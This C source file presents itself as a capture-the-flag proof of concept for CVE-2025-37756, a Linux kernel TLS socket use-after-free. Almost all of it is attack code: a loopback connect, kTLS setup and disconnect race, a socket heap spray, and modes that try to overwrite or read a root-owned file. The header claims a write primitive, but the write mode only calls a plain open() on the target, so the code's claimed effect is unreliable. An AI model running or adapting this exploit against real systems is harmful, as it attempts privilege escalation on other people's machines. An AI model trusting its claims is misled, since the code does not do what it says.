/*
 * CVE-2025-37756 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS (kTLS) socket disconnect state corruption
 *
 * When a TLS socket is disconnected while async crypto operations are
 * pending, the TLS context state machine enters an inconsistent state.
 * This leads to UAF when the pending operation completes after socket
 * teardown.
 *
 * Exploitation: Trigger TLS state corruption via connect/disconnect race,
 * heap spray to reclaim freed TLS context, gain write primitive.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/* TLS ULP constants */
#ifndef SOL_TLS
#define SOL_TLS 282
#endif
#ifndef TLS_TX
#define TLS_TX 1
#endif
#ifndef TCP_ULP
#define TCP_ULP 31
#endif

/* TLS 1.2 AES-GCM 128 crypto info */
#define TLS_CIPHER_AES_GCM_128             51
#define TLS_CIPHER_AES_GCM_128_IV_SIZE     8
#define TLS_CIPHER_AES_GCM_128_KEY_SIZE    16
#define TLS_CIPHER_AES_GCM_128_SALT_SIZE   4
#define TLS_CIPHER_AES_GCM_128_REC_SEQ_SIZE 8

struct tls12_crypto_info_aes_gcm_128 {
    struct {
        unsigned short version;
        unsigned short cipher_type;
    } info;
    unsigned char iv[TLS_CIPHER_AES_GCM_128_IV_SIZE];
    unsigned char key[TLS_CIPHER_AES_GCM_128_KEY_SIZE];
    unsigned char salt[TLS_CIPHER_AES_GCM_128_SALT_SIZE];
    unsigned char rec_seq[TLS_CIPHER_AES_GCM_128_REC_SEQ_SIZE];
};

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 32

static volatile int g_server_fd = -1;
static volatile int g_stop = 0;

/*
 * Server thread: accept connections for TLS handshake target
 */
static void *server_thread(void *arg) {
    (void)arg;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);

    while (!g_stop) {
        int client = accept(g_server_fd, (struct sockaddr *)&addr, &addrlen);
        if (client >= 0) {
            char buf[64];
            recv(client, buf, sizeof(buf), MSG_DONTWAIT);
            close(client);
        }
    }
    return NULL;
}

/*
 * Setup TLS on a connected TCP socket
 */
static int setup_tls(int fd) {
    /* Set TCP_ULP to "tls" */
    if (setsockopt(fd, SOL_TCP, TCP_ULP, "tls", 3) < 0) {
        return -1;
    }

    /* Configure TLS 1.2 AES-GCM-128 TX */
    struct tls12_crypto_info_aes_gcm_128 crypto_info;
    memset(&crypto_info, 0, sizeof(crypto_info));
    crypto_info.info.version = 0x0303; /* TLS 1.2 */
    crypto_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;

    if (setsockopt(fd, SOL_TLS, TLS_TX, &crypto_info,
                   sizeof(crypto_info)) < 0) {
        return -1;
    }
    return 0;
}

/*
 * Trigger TLS disconnect UAF via connect/setup/disconnect race
 */
static int trigger_tls_uaf(void) {
    int saved_errno;
    int uaf_triggered = 0;

    /* Create server socket */
    g_server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (g_server_fd < 0) return -1;

    int optval = 1;
    setsockopt(g_server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    struct sockaddr_in saddr;
    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(0); /* Random port */
    saddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(g_server_fd, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
        close(g_server_fd);
        return -1;
    }

    socklen_t slen = sizeof(saddr);
    getsockname(g_server_fd, (struct sockaddr *)&saddr, &slen);
    listen(g_server_fd, 16);

    poc_log_syscall("listen(server_fd)", 0L, 0);

    /* Start server thread */
    pthread_t srv;
    pthread_create(&srv, NULL, server_thread, NULL);

    /* Race loop: connect + TLS setup + immediate disconnect */
    for (int i = 0; i < RACE_ITERATIONS; i++) {
        int cfd = socket(AF_INET, SOCK_STREAM, 0);
        if (cfd < 0) continue;

        if (connect(cfd, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
            close(cfd);
            continue;
        }

        /* Attempt to set up TLS and immediately trigger disconnect */
        int tls_ret = setup_tls(cfd);
        saved_errno = errno;

        if (tls_ret == 0) {
            /* Send data then immediately shutdown - triggers async crypto UAF */
            char data[] = "TRIGGER_UAF";
            send(cfd, data, sizeof(data), MSG_DONTWAIT);
            shutdown(cfd, SHUT_RDWR);
            uaf_triggered++;
            poc_log("TLS UAF race iteration %d: TLS setup + disconnect", i);
        }
        close(cfd);
    }

    g_stop = 1;
    /* Wake up accept() */
    int wake = socket(AF_INET, SOCK_STREAM, 0);
    if (wake >= 0) {
        connect(wake, (struct sockaddr *)&saddr, sizeof(saddr));
        close(wake);
    }
    pthread_join(srv, NULL);
    close(g_server_fd);

    poc_log("TLS disconnect UAF: %d triggers in %d attempts",
            uaf_triggered, RACE_ITERATIONS);
    return uaf_triggered;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

/*
 * write_root_file mode
 */
static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int saved_errno;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Read before */
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    /* Trigger TLS disconnect UAF */
    poc_log("Triggering TLS disconnect state corruption...");
    int triggers = trigger_tls_uaf();

    /* Spray to reclaim freed TLS context */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    poc_log("Sprayed %d objects after TLS UAF", sprayed);

    /* Attempt write via corrupted state */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
    }

    /* Cleanup */
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");

    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }

    poc_print_fail("TLS UAF exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_tls_uaf();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
        return 0;
    }
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    int triggers = trigger_tls_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);

    /* Check corruption */
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }

    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();

    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-37756 CTF PoC ===");
    poc_log("Vuln: TLS socket disconnect state corruption UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }

    poc_log_close();
    return result;
}
